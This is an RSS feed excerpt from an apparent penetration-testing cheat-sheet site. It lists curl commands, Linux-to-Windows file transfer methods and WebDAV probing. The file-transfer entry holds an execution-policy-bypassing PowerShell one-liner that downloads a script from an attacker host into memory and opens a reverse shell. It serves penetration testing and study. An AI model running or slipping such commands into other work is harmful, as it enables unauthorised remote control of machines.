channel.title: Curl on TLDRBins
channel.description: Recent content in Curl on TLDRBins

item.title: curl
item.description: curl # Show header only curl -I <TARGET> # Save as the same name as the file on the server curl <TARGET>/<FILE> -O # GET url-encoded query curl -G --data-urlencode '<QUERY_STRING>' <TARGET> # POST url-encoded data curl --data-urlencode '<DATA>' <TARGET> # PUT a file curl -X PUT <TARGET>/<FILE> -d @<FILE> # PUT a file (Authenticate) curl -X PUT -u '<USER>:<PASSWORD>' <TARGET>/<FILE> -d @<FILE> # PUT a file as raw binary (Preserve newlines and control characters) curl -X PUT <TARGET>/<FILE> --data-binary @<FILE> # POST a file with form param curl -X POST -F '<PARAM>=@<FILE>;type=<APPLICATION_TYPE>;filename=<FILE>' <TARGET> # POST a file in raw-text format (Not as attachment) curl -X POST -F '<PARAM>=<<FILE>' <TARGET> # Not to handle sequences of '/.

item.title: File Transfer (Linux to Windows)
item.description: powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server <LOCAL_PORT> $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE> # Wget powershell -ep bypass wget <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE> # Curl powershell -ep bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE> Note: curl and wget are alias to Invoke-WebRequest # Load into memory and run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/<FILE>');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT> # Short version iex (iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -UseBasicParsing) Ref: rev.

item.title: WebDAV
item.description: Tools davtest curl # Without creds davtest -url http://<TARGET> # With creds davtest -url http://<TARGET> -auth '<USER>:<PASSWORD>' Ref: Download davtest # Rename a remote file curl -X MOVE -H 'Destination:http://<TARGET>/<NEW_FILENAME>' http://<TARGET>/<FILE>
